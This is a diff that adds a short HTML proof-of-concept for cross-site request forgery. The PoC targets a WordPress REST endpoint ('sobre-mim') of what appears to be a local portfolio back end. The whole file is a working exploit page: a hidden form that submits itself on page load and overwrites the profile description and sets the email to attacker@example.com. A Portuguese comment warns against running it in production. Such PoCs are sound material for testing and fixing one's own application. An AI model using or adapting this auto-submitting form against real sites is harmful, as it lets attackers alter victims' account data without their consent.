@@ -1,0 +1,14 @@
+<!-- CSRF PoC (não execute em ambientes de produção) -->
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>CSRF PoC</title></head>
+<body>
+<!-- Auto-submit form that posts to the vulnerable REST endpoint -->
+<form id="csrf" action="http://localhost/back-end-portfolio/wp-json/client/v1/sobre-mim" method="post">
+  <input type="hidden" name="descricao" value="Injected via CSRF - teste" />
+  <input type="hidden" name="email" value="attacker@example.com" />
+  <noscript><button type="submit">Enviar</button></noscript>
+</form>
+<script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
